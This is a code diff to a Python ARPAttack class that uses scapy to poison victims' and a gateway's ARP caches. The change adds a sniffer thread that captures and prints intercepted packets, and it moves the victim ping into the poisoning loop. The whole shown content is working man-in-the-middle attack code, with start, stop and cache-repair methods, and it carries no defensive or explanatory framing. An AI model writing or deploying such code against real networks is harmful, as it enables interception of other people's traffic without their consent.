@@ -1,7 +1,8 @@
 from threading import Thread
 from time import sleep
+from scapy.all import ARP, Ether, IP, ICMP, sendp, sr
 from entities import Host, Interface
-from scapy.all import ARP, Ether, IP, ICMP, send, sendp, sr
+from util import Sniffer
 
 class ARPAttack:
     def __init__(self,
@@ -20,15 +21,21 @@ class ARPAttack:
         self.victims = victims
         self.interval = interval
         self.active = False
+        self.sniffing_thread = Sniffer(self.interface, self.forward_packet)
 
     def start(self):
         self.active = True
-        self.ping()
+        # We don't need to keep a reference to this thread because the thread will stop automatically
         Thread(target = self.poison_cache).start()
+        self.sniffing_thread.start()
 
     def stop(self):
         self.active = False
+        self.sniffing_thread.join()
         self.repair_cache()
+
+    def forward_packet(self, packet):
+        packet.show()
 
     def ping(self):
         for victim in self.victims:
@@ -43,6 +50,10 @@ class ARPAttack:
             sr(ping, iface=self.interface.name, timeout=1, verbose=0)
 
     def poison_cache(self):
+        # The victims and gateway need to know of each others existence before
+        # the attack can be performed (or so it seems, at least)
+        self.ping()
+
         while True:
             if not self.active:
                 return
